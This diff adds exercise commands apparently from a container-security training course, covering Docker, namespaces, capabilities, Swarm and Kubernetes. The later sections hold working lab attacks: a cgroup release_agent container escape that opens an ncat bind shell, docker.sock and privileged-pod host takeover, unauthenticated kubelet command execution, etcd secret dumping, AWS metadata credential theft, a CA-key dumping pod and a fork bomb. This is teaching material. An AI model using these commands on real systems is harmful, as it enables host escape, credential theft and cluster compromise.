@@ -1,0 +1,2881 @@
+## Exercise - Getting help on Docker
+-----------------
+ 
+
+docker --help
+
+ 
+
+docker run --help
+
+ 
+--
+ 
+## Exercise - “Hello Docker”
+-----------------
+ 
+
+docker run hello-world
+
+ 
+--
+ 
+## Exercise - Single Command Containers
+-----------------
+ 
+
+docker run alpine ip addr
+
+ 
+--
+ 
+## Exercise - Interactive Containers
+-----------------
+ 
+
+docker run -it alpine /bin/ash
+
+ 
+--
+ 
+## Exercise - Interactive Containers (2)
+-----------------
+ 
+
+CTRL-PQ
+
+ 
+
+docker ps
+
+ 
+
+docker attach <id>
+
+ 
+--
+ 
+## Exercise - Background Containers
+-----------------
+ 
+
+docker run -d nginx
+
+ 
+
+docker ps
+
+ 
+
+docker stop <nginx_id_here>
+
+ 
+--
+ 
+## Exercise - Container Names
+-----------------
+ 
+
+docker run --name webserver -d nginx
+
+ 
+
+docker container ls
+
+ 
+
+docker stop webserver
+
+ 
+--
+ 
+## Exercise - Container Persistence
+-----------------
+ 
+
+docker ps -a
+
+ 
+--
+ 
+## Exercise - Finding Images on the Hub
+-----------------
+ 
+
+docker search nmap
+
+ 
+--
+ 
+## Exercise - Working with External Data
+-----------------
+ 
+
+docker run --name=nmap mcscourse/nmap -sT -oA test <YOUR_IP>
+
+ 
+--
+ 
+## Exercise - Working with External Data 2
+-----------------
+ 
+
+mkdir ~/vol_test
+
+ 
+
+docker run -v ~/vol_test:/output mcscourse/nmap -sT -oA /output/test <YOUR_IP>
+
+ 
+--
+ 
+## Exercise - Working with External Data 5
+-----------------
+ 
+
+docker cp nmap:/test.xml ./
+
+ 
+--
+ 
+## Exercise - Accessing a Web Service
+-----------------
+ 
+
+docker run --name=netwebserver -d nginx
+
+ 
+
+docker inspect -f "{{ .NetworkSettings.IPAddress }}" netwebserver
+
+ 
+
+curl http://[IP]
+
+ 
+--
+ 
+## Exposing Services
+-----------------
+ 
+
+docker run -d -p 8080:80 nginx
+
+ 
+--
+ 
+## Exercise - Using ctr to Observe Docker
+-----------------
+ 
+
+sudo ctr --address /var/run/containerd/containerd.sock events
+
+ 
+
+docker run -it alpine /bin/ash
+
+ 
+--
+ 
+## Exercise - Container Process Hierarchy
+-----------------
+ 
+
+docker run -d nginx
+
+ 
+
+ps auxf
+
+ 
+--
+ 
+## Exercise - Running a Container with runc
+-----------------
+ 
+
+mkdir -p runctest/rootfs
+
+cd runctest
+
+docker export $(docker create alpine) | tar --directory rootfs -xvf -
+
+ 
+--
+ 
+## Exercise - Running a Container with runc - 2
+-----------------
+ 
+
+runc spec
+
+sudo runc run runctest
+
+ 
+--
+ 
+## Exercise - Docker Network
+-----------------
+ 
+
+docker network ls
+
+ 
+--
+ 
+## Exercise - Checking out the Default Network
+-----------------
+ 
+
+docker network inspect bridge
+
+ 
+
+docker run -d nginx
+
+ 
+
+docker network inspect bridge
+
+ 
+--
+ 
+## Exercise - Exposing a port
+-----------------
+ 
+
+sudo iptables -L
+
+ 
+
+docker run --name=testnginx -d -p 8000:80 nginx
+
+ 
+
+sudo iptables -L
+
+ 
+--
+ 
+## Exercise - Checking out Docker networks with brctl
+-----------------
+ 
+
+brctl show
+
+ 
+
+docker network create testnet2
+
+ 
+
+brctl show
+
+ 
+--
+ 
+## Exercise – Checking out the Host Network
+-----------------
+ 
+
+docker run -it --network=host alpine /bin/ash
+
+ 
+
+ip addr
+
+ 
+--
+ 
+## Exercise – None Network
+-----------------
+ 
+
+docker run -it --network=none alpine /bin/ash
+
+ 
+
+ip addr
+
+ 
+--
+ 
+## Create a MACVLAN network
+-----------------
+ 
+
+ip addr
+
+ 
+
+docker network create -d macvlan --subnet=<net> --gateway=<gateway> -o parent=<iface> mac_net
+
+ 
+
+docker run -it --net=mac_net --ip=<spare_ip> alpine /bin/sh
+
+ 
+
+ip addr
+
+ 
+--
+ 
+## Exercise - Basic Dockerfile
+-----------------
+ 
+
+nano Dockerfile
+
+ 
+
+FROM alpine:latest
+
+ 
+
+RUN apk update && apk add nikto && rm -rf /var/cache/apk/*
+
+ 
+
+CMD ["nikto.pl"]
+
+ 
+--
+ 
+## Exercise - Building an Image
+-----------------
+ 
+
+docker build -t cmdnikto .
+
+ 
+--
+ 
+## Exercise - CMD & ENTRYPOINT
+-----------------
+ 
+
+docker run cmdnikto
+
+ 
+
+docker run cmdnikto -H
+
+ 
+
+docker run cmdnikto ls
+
+ 
+--
+ 
+## Exercise - CMD & ENTRYPOINT 2
+-----------------
+ 
+
+docker build -t entrynikto .
+
+ 
+
+docker run entrynikto
+
+ 
+
+docker run entrynikto -H
+
+ 
+
+docker run entrynikto ls
+
+ 
+--
+ 
+## Exercise - non-root Image
+-----------------
+ 
+
+FROM ubuntu:18.04
+
+RUN groupadd -g 999 mcsuser && 
+    useradd -r -u 999 -g mcsuser mcsuser
+
+USER mcsuser
+
+CMD ["/bin/bash", "-c", "--", "while true; do sleep 30; done;"]
+
+ 
+
+docker build -t usertest .
+
+ 
+--
+ 
+## Exercise - non-root Image 2
+-----------------
+ 
+
+docker run -d usertest 
+
+ 
+
+ps -ef
+
+ 
+--
+ 
+## Moving Images
+-----------------
+ 
+
+docker save <image> -o <filename>
+
+ 
+--
+ 
+## Ersatz Container Building 
+-----------------
+ 
+
+docker run -it --name committest alpine /bin/ash
+
+ 
+
+apk update
+
+ 
+
+apk add nmap
+
+ 
+
+exit
+
+ 
+
+docker commit committest alpine_nmap
+
+ 
+--
+ 
+## Publishing to Docker Hub
+-----------------
+ 
+
+docker login
+
+ 
+--
+ 
+## Publishing to Docker Hub - 2
+-----------------
+ 
+
+docker tag SOURCE_IMAGE USERNAME/DESTINATION_IMAGE
+
+ 
+
+docker push USERNAME/DESTINATION_IMAGE
+
+ 
+--
+ 
+## Exercise - Building a Single Binary Container
+-----------------
+ 
+
+FROM golang:onbuild
+
+RUN mkdir /app
+
+ADD . /app/
+
+WORKDIR /app
+
+RUN CGO_ENABLED=0 GOOS=linux go build -a -installsuffix cgo -o main .
+
+FROM scratch
+
+COPY --from=0 /app/main /main
+
+CMD ["/main"]
+
+ 
+--
+ 
+## Exercise - Building a Single Binary Container 2
+-----------------
+ 
+
+cd ~/scratch-container
+
+ 
+
+docker build -t staticcontainer .
+
+ 
+
+docker run --name=teststatic staticcontainer
+
+ 
+--
+ 
+## Exercise - mnt namespace
+-----------------
+ 
+
+docker run -d nginx
+
+ 
+
+docker exec <container_name> touch /Lorem
+
+ 
+
+ps -ef | grep nginx
+
+ 
+
+sudo nsenter --target <nginx_pid> --mount ls /
+
+ 
+--
+ 
+## net namespace
+-----------------
+ 
+
+sudo nsenter --target <nginx_pid> --net ip addr
+
+ 
+--
+ 
+## pid namespace
+-----------------
+ 
+
+sudo unshare --fork --pid --mount-proc bash
+
+ 
+--
+ 
+## Exercise - user namespace
+-----------------
+ 
+
+unshare --fork --pid --mount-proc -U -r bash
+
+ 
+
+whoami
+
+ 
+
+touch /etc/test
+
+ 
+--
+ 
+## Exercise - Listing namespaces
+-----------------
+ 
+
+sudo lsns
+
+ 
+
+docker run -d nginx
+
+ 
+
+sudo lsns
+
+ 
+--
+ 
+## Exercise - Changing the Time?
+-----------------
+ 
+
+docker run -it alpine /bin/ash
+
+ 
+
+whoami
+
+ 
+
+date +%T -s "12:12:12"
+
+ 
+--
+ 
+## Exercise - Answering our Time Question
+-----------------
+ 
+
+docker run -it alpine /bin/ash
+
+ 
+
+pscap
+
+ 
+--
+ 
+## Exercise - Dropping cap_net_raw
+-----------------
+ 
+
+docker run -it alpine /bin/ash
+
+ 
+
+ping 8.8.8.8
+
+ 
+
+docker run --cap-drop=NET_RAW -it alpine /bin/ash
+
+ 
+
+ping 8.8.8.8
+
+ 
+
+docker run -it --sysctl "net.ipv4.ping_group_range=0 1000000000" --cap-drop=NET_RAW
+ alpine ping -c 3 8.8.8.8
+
+ 
+--
+ 
+## Exercise - cap-drop=all
+-----------------
+ 
+
+docker run -it --cap-drop=all alpine /bin/ash
+
+ 
+
+mkdir /home/test
+
+ 
+--
+ 
+## An Aside - Watching Out for Capabilities
+-----------------
+ 
+
+filecap /usr
+
+ 
+--
+ 
+## Exercise - Limiting a Container
+-----------------
+ 
+
+docker run -d --name=busycontainer --cpus=0.5 busybox md5sum /dev/urandom
+
+ 
+
+top
+
+ 
+
+docker stop busycontainer
+
+ 
+--
+ 
+## Exercise - PIDS Limit
+-----------------
+ 
+
+docker run --pids-limit 10 -it debian:latest /bin/bash
+
+ 
+
+:(){ :|: & };:
+
+ 
+--
+ 
+## Exercise - Docker AppArmor
+-----------------
+ 
+
+docker info | grep apparmor
+
+ 
+
+sudo apparmor_status
+
+ 
+
+docker run -d nginx
+
+ 
+
+sudo apparmor_status
+
+ 
+--
+ 
+## Exercise - Seccomp
+-----------------
+ 
+
+docker run --rm -it --cap-add ALL --security-opt apparmor=unconfined 
+ --security-opt seccomp=~/seccomp-profiles/deny.json alpine /bin/ash
+
+ 
+--
+ 
+## Exercise - Seccomp 2
+-----------------
+ 
+
+docker run --rm -it 
+--security-opt seccomp=~/seccomp-profiles/default-no-chmod.json alpine /bin/ash
+
+ 
+
+chmod 777 /etc/passwd
+
+ 
+--
+ 
+## Exercise - Docker Image History
+-----------------
+ 
+
+docker image pull wordpress
+
+ 
+
+docker history wordpress
+
+ 
+
+docker history --no-trunc wordpress
+
+ 
+--
+ 
+## Exercise - Docker Container History
+-----------------
+ 
+
+docker run --name hist -it alpine /bin/ash
+
+mkdir test && touch /test/Lorem
+
+exit
+
+ 
+
+docker container diff hist
+
+docker container commit hist history_test
+
+docker image history history_test
+
+ 
+--
+ 
+## Exercise - Manual Reversing
+-----------------
+ 
+
+mkdir testimage && cd testimage
+
+ 
+
+docker pull mcscourse/alpine-containertools
+
+ 
+
+docker save -o testimage.tar mcscourse/alpine-containertools
+
+ 
+
+tar -xvf testimage.tar
+
+ 
+--
+ 
+## Exercise - Manual Reversing 2
+-----------------
+ 
+
+cat 69994702368732f1fcd93d3be675bc1135f46950f08a1f44f647acb337dc85b5.json | jq
+
+ 
+--
+ 
+## Exercise - Automated Analysis
+-----------------
+ 
+
+whaler -sV=1.39 mcscourse/alpine-containertools
+
+ 
+--
+ 
+## Exercise - Diving into Containertools
+-----------------
+ 
+
+dive mcscourse/alpine-containertools
+
+ 
+--
+ 
+## Exercise - Using Socat to see traffic to the Docker socket
+-----------------
+ 
+
+sudo socat -v UNIX-LISTEN:/tmp/tempdock.sock,fork UNIX-CONNECT:/var/run/docker.sock 
+
+ 
+
+sudo docker -H unix:///tmp/tempdock.sock images
+
+ 
+--
+ 
+## Breaking out of a “Privileged” Container
+-----------------
+ 
+
+docker run -it --privileged ubuntu:18.04 /bin/bash
+
+ 
+
+mount
+
+ 
+
+mkdir /rootfs
+
+ 
+
+mount /dev/nvme0n1p1 /rootfs
+
+ 
+--
+ 
+## Another privileged breakout
+-----------------
+ 
+
+d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+
+mkdir -p $d/w;echo 1 >$d/w/notify_on_release
+
+t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+
+touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
+
+$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
+
+ 
+
+./escape.sh "apt install nmap -y; ncat -l 9999 -e /bin/bash"
+
+ 
+--
+ 
+## Exercise - Abusing Docker.sock
+-----------------
+ 
+
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock
+ mcscourse/alpine-containertools /bin/ash
+
+ 
+--
+ 
+## Exercise - "The most pointless Docker command ever"
+-----------------
+ 
+
+docker run -it -v /var/run/docker.sock:/var/run/docker.sock
+ mcscourse/alpine-containertools /bin/ash
+
+ 
+
+docker run -ti --privileged --net=host --pid=host
+ --ipc=host --volume /:/host busybox chroot /host
+
+ 
+--
+ 
+## Exercise - Docker Bench
+-----------------
+ 
+
+docker run -it --net host --pid host --cap-add audit_control 
+    -e DOCKER_CONTENT_TRUST=$DOCKER_CONTENT_TRUST 
+    -v /var/lib:/var/lib 
+    -v /var/run/docker.sock:/var/run/docker.sock 
+    -v /usr/lib/systemd:/usr/lib/systemd 
+    -v /etc:/etc --label docker_bench_security 
+    docker/docker-bench-security
+
+ 
+--
+ 
+## Exercise - Vulnerability Scanning with Clair
+-----------------
+ 
+
+docker run -d --name db arminc/clair-db:2020-01-16
+
+ 
+
+docker run -p 6060:6060 --link db:postgres
+ -d --name clair arminc/clair-local-scan:v2.0.6
+
+ 
+
+docker pull mcscourse/http-echo:latest
+
+ 
+
+clair-scanner --clair="[http://Student.IP:6060]" --ip="[Student.IP]" mcscourse/http-echo:latest
+
+ 
+--
+ 
+## Exercise - Vulnerability Scanning with Trivy
+-----------------
+ 
+
+trivy mcscourse/http-echo:latest
+
+ 
+--
+ 
+## Running GUI programs in Docker 
+-----------------
+ 
+
+ssh -X ubuntu@[Student.IP]
+
+ 
+
+docker run -it --net=host -e DISPLAY=$DISPLAY
+ -v /tmp/.X11-unix:/tmp/.X11-unix -v /dev/shm:/dev/shm
+ -v ~/.Xauthority:/root/.Xauthority raesene/firefox-v20
+
+ 
+--
+ 
+## Exercise - Another way to squash
+-----------------
+ 
+
+docker run --name tobesquashed -d ubuntu:18.04 /bin/true
+
+ 
+
+docker export tobesquashed | docker import - squashed
+
+ 
+
+docker history squashed
+
+ 
+--
+ 
+## Exercise - network namespace joining
+-----------------
+ 
+
+docker run --name nginxtest -d nginx
+
+ 
+
+docker run -it --net container:nginxtest raesene/alpine-containertools  /bin/ash
+
+ 
+
+netstat -tunap
+
+ 
+--
+ 
+## Exercise - Creating some dind "nodes"
+-----------------
+ 
+
+docker run --privileged --name swarm-master -d docker:dind
+
+docker run --privileged --name swarm-worker-1 -d docker:dind
+
+docker run --privileged --name swarm-worker-2 -d docker:dind
+
+ 
+--
+ 
+## Exercise - Swarm setup
+-----------------
+ 
+
+docker exec -it swarm-master /bin/ash
+
+ 
+
+docker swarm init
+
+ 
+--
+ 
+## Exercise - Joining the Workers
+-----------------
+ 
+
+docker exec -it swarm-worker-1 /bin/ash
+
+ 
+--
+ 
+## Exercise - Validating your swarm
+-----------------
+ 
+
+docker exec -it swarm-master /bin/ash
+
+ 
+
+docker node ls
+
+ 
+
+docker node inspect <node_name>
+
+ 
+--
+ 
+## Exercise - Docker Services
+-----------------
+ 
+
+docker service create --name test -p 8080:80 nginx
+
+ 
+
+docker service ls
+
+ 
+--
+ 
+## Exercise - Scaling our Service
+-----------------
+ 
+
+docker service scale test=2
+
+ 
+
+docker service ls
+
+ 
+--
+ 
+## Exercise - Swarm Networking
+-----------------
+ 
+
+docker network ls
+
+ 
+
+docker network inspect ingress
+
+ 
+--
+ 
+## Exercise - Custom Overlay Networks
+-----------------
+ 
+
+docker network create --driver=overlay testnet
+
+ 
+
+docker service create --network=testnet --name=test2
+ -p 8081:80 --replicas=2 nginx
+
+ 
+
+docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' <container>
+
+ 
+--
+ 
+## Installation - 2
+-----------------
+ 
+
+sudo nano /etc/docker/daemon.json
+
+ 
+
+{
+
+    "runtimes": {
+
+        "runsc": {
+
+            "path": "/usr/local/bin/runsc"
+
+        }
+
+    }
+
+}     
+
+ 
+
+sudo systemctl restart docker
+
+ 
+--
+ 
+## GVisor Operation
+-----------------
+ 
+
+docker run --runtime=runsc --name=gvisor -d nginx
+
+ 
+--
+ 
+## Differences - 1
+-----------------
+ 
+
+docker run --name=runc -d nginx
+
+ 
+--
+ 
+## Differences - 2
+-----------------
+ 
+
+docker inspect --format='{{.HostConfig.Runtime}}' gvisor
+
+ 
+
+docker inspect --format='{{.HostConfig.Runtime}}' runc
+
+ 
+--
+ 
+## katacontainers Installation
+-----------------
+ 
+
+bash -c "$(curl -fsSL https://raw.githubusercontent.com/kata-containers/tests/master/cmd/kata-manager/kata-manager.sh) install-packages"
+
+ 
+--
+ 
+## Setup
+-----------------
+ 
+
+{
+
+  "runtimes": {
+
+    "kata-runtime": {
+
+      "path": "/usr/bin/kata-runtime"
+
+    }
+
+  }
+
+}
+
+ 
+
+sudo systemctl restart docker
+
+ 
+--
+ 
+## KataContainers Operation
+-----------------
+ 
+
+docker run --runtime=kata-runtime --name=kata -d nginx
+
+ 
+--
+ 
+## Differences
+-----------------
+ 
+
+rorym@docker1809beta:~$ docker exec kata uname -a
+
+Linux 2f3d2515849a 4.14.67-18.container #1 SMP Fri Sep 28 02:57:16 UTC 2018 x86_64 GNU/Linux
+
+ 
+--
+ 
+## Lets try it out!
+-----------------
+ 
+
+mkdir ~/.kube
+
+ 
+
+cp ~/vulnclusterkubeconfig/config ~/.kube/config
+
+ 
+
+kubectl get po
+
+ 
+
+kubectl get po -n kube-system
+
+ 
+
+kubectl get nodes
+
+ 
+--
+ 
+## Exercise - Running a new pod
+-----------------
+ 
+
+kubectl run -it yourinitials1 --image=mcscourse/alpine-containertools /bin/ash
+
+ 
+--
+ 
+## A quick look around
+-----------------
+ 
+
+ip addr
+
+ 
+
+route -n
+
+ 
+
+traceroute 8.8.8.8
+
+ 
+--
+ 
+## A basic Example
+-----------------
+ 
+
+apiVersion: v1
+
+kind: Pod
+
+metadata:
+
+  name: badcontainer
+
+  labels:
+
+spec:
+
+  containers:
+
+  - name: badcontainer
+
+    image: mcscourse/alpine-containertools
+
+ 
+--
+ 
+## Exercise - Create a deployment with YAML
+-----------------
+ 
+
+kubectl create -f ~/manifests/badcontainer.yml
+
+ 
+
+kubectl delete -f ~/manifests/badcontainer.yml
+
+ 
+--
+ 
+## Exercise - cluster setup with kind
+-----------------
+ 
+
+kind create cluster --config=/home/ubuntu/kind_base_config/config.yaml
+
+ 
+--
+ 
+## A quick look at kind
+-----------------
+ 
+
+kubectl get po -n kube-system
+
+ 
+
+kubectl get nodes
+
+ 
+--
+ 
+## Sample Deployment Manifest
+-----------------
+ 
+
+apiVersion: apps/v1
+
+kind: Deployment
+
+metadata:
+
+  name: nginx-deployment
+
+  labels:
+
+    app: nginx
+
+spec:
+
+  replicas: 2
+
+  selector:
+
+    matchLabels:
+
+      app: nginx
+
+template:
+
+    metadata:
+
+      labels:
+
+        app: nginx
+
+    spec:
+
+      containers:
+
+      - name: nginx
+
+        image: nginx:1.7.9
+
+        ports:
+
+        - containerPort: 80
+
+ 
+--
+ 
+## Exercise - Creating a deployment
+-----------------
+ 
+
+kubectl create -f ~/manifests/sample-deployment.yaml
+
+ 
+
+kubectl get deployments
+
+ 
+
+kubectl get replicasets
+
+ 
+
+kubectl get pods
+
+ 
+--
+ 
+## Sample daemonset manifest
+-----------------
+ 
+
+apiVersion: apps/v1
+
+kind: DaemonSet
+
+metadata:
+
+  name: fluentd-elasticsearch
+
+  namespace: kube-system
+
+  labels:
+
+    k8s-app: fluentd-logging
+
+spec:
+
+  selector:
+
+    matchLabels:
+
+      name: fluentd-elasticsearch
+
+  template:
+
+    metadata:
+
+      labels:
+
+        name: fluentd-elasticsearch
+
+    spec:
+
+      tolerations:
+
+      - key: node-role.kubernetes.io/master
+
+        effect: NoSchedule
+
+      containers:
+
+      - name: fluentd-elasticsearch
+
+        image: quay.io/fluentd_elasticsearch/fluentd:v2.5.2
+
+ 
+--
+ 
+## New Resources!
+-----------------
+ 
+
+kubectx vadmin@vuln
+
+ 
+
+kubectl --namespace=sock-shop get all
+
+ 
+--
+ 
+## Kubernetes Pod & Service Networking
+-----------------
+ 
+
+kubectl --namespace=sock-shop get po
+
+ 
+
+kubectl --namespace=sock-shop describe pod <name>
+
+ 
+
+kubectl --namespace=sock-shop get svc
+
+ 
+--
+ 
+## Exposing Applications - Node Ports
+-----------------
+ 
+
+apiVersion: v1 
+
+kind: Service 
+
+metadata: 
+
+  name: front-end 
+
+  labels: 
+
+    name: front-end 
+
+    namespace: sock-shop 
+
+  spec: 
+
+    type: NodePort 
+
+    ports: 
+
+      - port: 80 
+
+        targetPort: 8079 
+
+        nodePort: 30001
+
+ 
+--
+ 
+## Exercise - accessing our app.
+-----------------
+ 
+
+kubectl -n sock-shop get svc front-end
+
+ 
+--
+ 
+## Attacking the API Server
+-----------------
+ 
+
+kubectl get nodes
+
+ 
+
+kubectl -shttps://172.27.10.10:6443 get po
+
+ 
+
+kubectl -shttp://172.27.10.10:8080 get po -n kube-system
+
+ 
+--
+ 
+## Unauthenticated Discovery - Possible paths
+-----------------
+ 
+
+  - /api
+
+  - /api/*
+
+  - /apis
+
+  - /apis/*
+
+  - /healthz
+
+  - /openapi
+
+  - /openapi/*
+
+  - /swagger-2.0.0.pb-v1
+
+  - /swagger.json
+
+  - /swaggerapi
+
+  - /swaggerapi/*
+
+  - /version
+
+  - /version/
+
+ 
+--
+ 
+## Exercise - Attacking the Kubelet Read Only
+-----------------
+ 
+
+curl http://172.27.10.10:10255/
+
+ 
+
+curl http://172.27.10.10:10255/pods/ | jq
+
+ 
+--
+ 
+## Exercise - Attacking the Kubelet Read/Write
+-----------------
+ 
+
+curl https://172.27.10.10:10250/runningpods/ -k | jq
+
+ 
+--
+ 
+## Exercise - Kubelet Command Execution
+-----------------
+ 
+
+curl https://172.27.10.10:10250/run/kube-system/kube-apiserver-vuln/kube-apiserver -k -XPOST -d "cmd=whoami"
+
+ 
+--
+ 
+## Exercise - Attacking the Kubelet Read/Write - 2
+-----------------
+ 
+
+/logs/
+
+/runningpods/
+
+/portForward/
+
+…
+
+ 
+--
+ 
+## Exercise - Attacking etcd
+-----------------
+ 
+
+curl -k https://172.27.10.10:2379/version
+
+ 
+--
+ 
+## Exercise - Cluster compromise with etcd
+-----------------
+ 
+
+export ETCDCTL_API=3
+
+ 
+
+etcdctl --insecure-skip-tls-verify --insecure-transport=false
+ --endpoints=https://172.27.10.10:2379
+ get / --prefix --keys-only
+
+ 
+
+etcdctl --insecure-skip-tls-verify --insecure-transport=false
+ --endpoints=https://172.27.10.10:2379
+ get /registry/secrets/kube-system/default-token-[RAND]
+
+ 
+
+curl -k -H "Authorization: Bearer [TOKEN]" https://172.27.10.10:6443
+
+ 
+--
+ 
+## Exercise - Cluster compromise with etcd - 2
+-----------------
+ 
+
+etcdctl --insecure-skip-tls-verify
+ --insecure-transport=false
+ --endpoints=https://172.27.10.10:2379
+ get /registry/secrets/kube-system/default-token-[RAND] | auger decode
+
+ 
+--
+ 
+## Exercise - Exploiting service tokens
+-----------------
+ 
+
+kubectl run -it YOURINITIALSalptest --image=mcscourse/alpine-containertools /bin/ash
+
+ 
+
+kubectl get po --namespace=kube-system
+
+ 
+--
+ 
+## Exercise - AWS Metadata Access
+-----------------
+ 
+
+curl http://169.254.169.254/
+
+ 
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials
+
+ 
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE]
+
+ 
+--
+ 
+## Authentication - Basic/Token Auth
+-----------------
+ 
+
+kubectx kind-kind
+
+ 
+--
+ 
+## Exercise - Basic Auth.
+-----------------
+ 
+
+docker exec -it kind-control-plane bash
+
+ 
+
+apt update && apt install -y nano
+
+ 
+
+nano /etc/kubernetes/pki/basic-auth.csv
+
+ 
+
+mypass,user1,user1,"system:masters"
+
+ 
+--
+ 
+## Exercise - Basic Auth - 2
+-----------------
+ 
+
+nano /etc/kubernetes/manifests/kube-apiserver.yaml
+
+ 
+
+ - --basic-auth-file=/etc/kubernetes/pki/basic-auth.csv
+
+ 
+
+exit
+
+ 
+
+curl -sk --user user1:mypass https://127.0.0.1:40000/api/
+
+ 
+--
+ 
+## Exercise - Client Certificate Authentication
+-----------------
+ 
+
+docker exec -it kind-control-plane bash
+
+ 
+
+cd /certs
+
+ 
+
+openssl genrsa -out user1.key 2048
+
+ 
+
+openssl req -new -key user1.key -out user1.csr -subj "/CN=user1/O=group1"
+
+ 
+
+openssl x509 -req -in user1.csr -CA /etc/kubernetes/pki/ca.crt -CAkey
+ /etc/kubernetes/pki/ca.key -CAcreateserial -out user1.crt
+
+ 
+
+chmod 777 *
+
+ 
+
+exit
+
+ 
+--
+ 
+## Exercise - Client Certificate Authentication - 2 
+-----------------
+ 
+
+kubectl config set-credentials user1
+ --client-certificate=/home/ubuntu/certs/user1.crt
+ --client-key=/home/ubuntu/certs/user1.key --embed-certs=true
+
+ 
+
+kubectl config set-context user1@kind
+ --cluster=kind-kind --user=user1
+
+ 
+
+kubectx user1@kind
+
+ 
+
+kubectl get po
+
+ 
+--
+ 
+## Using Client Certificates with curl
+-----------------
+ 
+
+cd /home/ubuntu/certs
+
+ 
+
+curl -sk --cert user1.crt --key user1.key https://127.0.0.1:40000/api/
+
+ 
+
+curl -sk --cert user1.crt --key user1.key https://127.0.0.1:40000/api/v1/pods
+
+ 
+--
+ 
+## Exercise - RBAC
+-----------------
+ 
+
+kubectx kind-kind
+
+ 
+
+kubectl get clusterroles -o yaml
+
+ 
+
+kubectl get clusterrolebindings -o yaml
+
+ 
+--
+ 
+## Exercise - RBAC - 2
+-----------------
+ 
+
+kubectx user1@kind
+
+ 
+
+kubectl get po
+
+ 
+--
+ 
+## Exercise - RBAC - 3
+-----------------
+ 
+
+kubectx kind-kind
+
+ 
+
+kubectl create clusterrolebinding
+ group1-binding --clusterrole=cluster-admin
+ --group=group1
+
+ 
+--
+ 
+## Exercise - RBAC - 4
+-----------------
+ 
+
+kubectx user1@kind
+
+ 
+
+kubectl get po -n kube-system
+
+ 
+--
+ 
+## Kubernetes Permission Auditing - Manual
+-----------------
+ 
+
+kubectl get clusterrole cluster-admin -o yaml
+
+ 
+
+kubectl get clusterrolebinding cluster-admin -o yaml
+
+ 
+--
+ 
+## Kubernetes Permission Auditing - kubectl
+-----------------
+ 
+
+kubectl auth can-i get pods
+
+ 
+
+kubectl auth can-i --as system:serviceaccount:kube-system:node-controller get pods
+
+ 
+
+kubectl auth can-i --list
+
+ 
+--
+ 
+## Exercise - Rakkess
+-----------------
+ 
+
+rakkess
+
+ 
+
+rakkess --sa kube-system:daemon-set-controller
+
+ 
+--
+ 
+## Exercise - kubectl-who-can
+-----------------
+ 
+
+kubectl-who-can get secrets
+
+ 
+
+kubectl-who-can create pods
+
+ 
+--
+ 
+## Exercise - rback
+-----------------
+ 
+
+kubectl get sa,roles,rolebindings,clusterroles,clusterrolebindings --all-namespaces -o json | rback > result.dot 
+
+ 
+
+dot -Tpng result.dot > result.png
+
+ 
+--
+ 
+## Exercise - Pod Security Policies
+-----------------
+ 
+
+apiVersion: extensions/v1beta1
+
+kind: PodSecurityPolicy
+
+metadata:
+
+  name: restrict-root
+
+spec:
+
+  privileged: false
+
+  runAsUser:
+
+    rule: MustRunAsNonRoot
+
+  seLinux:
+
+    rule: RunAsAny
+
+  supplementalGroups:
+
+    rule: RunAsAny
+
+  fsGroup:
+
+    rule: RunAsAny
+
+  volumes:
+
+  - '*'
+
+ 
+--
+ 
+## Exercise - Pod Security Policies - 2
+-----------------
+ 
+
+kubectl create -f ~/psp/restrict-root.yml
+
+ 
+
+docker exec -it kind-control-plane bash
+
+ 
+
+nano /etc/kubernetes/manifests/kube-apiserver.yaml
+
+ 
+
+exit
+
+ 
+--
+ 
+## Exercise - Pod Security Policies - 3
+-----------------
+ 
+
+apiVersion: v1
+
+kind: Pod
+
+metadata:
+
+  name: privpod
+
+  labels:
+
+spec:
+
+  containers:
+
+  - name: privpod
+
+    image: raesene/alpine-containertools
+
+    securityContext:
+
+  privileged: true
+
+ 
+--
+ 
+## Exercise - Pod Security Policies - 4
+-----------------
+ 
+
+kubectl create -f ~/manifests/privpod.yml
+
+ 
+
+docker exec -it kind-control-plane bash
+
+ 
+
+nano /etc/kubernetes/manifests/kube-apiserver.yaml
+
+ 
+
+exit
+
+ 
+--
+ 
+## A standard setup
+-----------------
+ 
+
+kind: ClusterRole
+
+apiVersion: rbac.authorization.k8s.io/v1
+
+metadata:
+
+  name: psp-lowpriv
+
+rules:
+
+- apiGroups:
+
+  - extensions
+
+  resources:
+
+  - podsecuritypolicies
+
+  resourceNames:
+
+  - lowPriv
+
+  verbs:
+
+  - use
+
+ 
+
+kind: ClusterRole
+
+apiVersion: rbac.authorization.k8s.io/v1
+
+metadata:
+
+  name: psp-highpriv
+
+rules:
+
+- apiGroups:
+
+  - extensions
+
+  resources:
+
+  - podsecuritypolicies
+
+  resourceNames:
+
+  - highPriv
+
+  verbs:
+
+  - use
+
+ 
+
+kind: ClusterRoleBinding
+
+apiVersion: rbac.authorization.k8s.io/v1
+
+metadata:
+
+  name: psp-default
+
+subjects:
+
+- kind: Group
+
+  name: system:authenticated
+
+roleRef:
+
+  kind: ClusterRole
+
+  name: psp-lowpriv
+
+  apiGroup: rbac.authorization.k8s.io
+
+ 
+
+apiVersion: rbac.authorization.k8s.io/v1beta1
+
+kind: RoleBinding
+
+metadata:
+
+  name: psp-permissive
+
+  namespace: kube-system
+
+roleRef:
+
+  apiGroup: rbac.authorization.k8s.io
+
+  kind: ClusterRole
+
+  name: psp-highpriv
+
+subjects:
+
+- kind: ServiceAccount
+
+  name: daemon-set-controller
+
+  namespace: kube-system
+
+- kind: ServiceAccount
+
+  name: replicaset-controller
+
+  namespace: kube-system
+
+- kind: ServiceAccount
+
+  name: deployment-controller
+
+  namespace: kube-system
+
+ 
+--
+ 
+## Exercise - getting root the easy way
+-----------------
+ 
+
+kubectl create -f /home/ubuntu/manifests/noderoot.yml
+
+ 
+
+kubectl exec -it noderootpod chroot /host
+
+ 
+--
+ 
+## Key Dumper
+-----------------
+ 
+
+spec:
+
+  containers:
+
+  - name: keydumper-pod
+
+    image: busybox
+
+    volumeMounts:
+
+    - mountPath: /pki
+
+      name: keyvolume
+
+    command: ['cat', '/pki/ca.key']
+
+  volumes:
+
+  - name: keyvolume
+
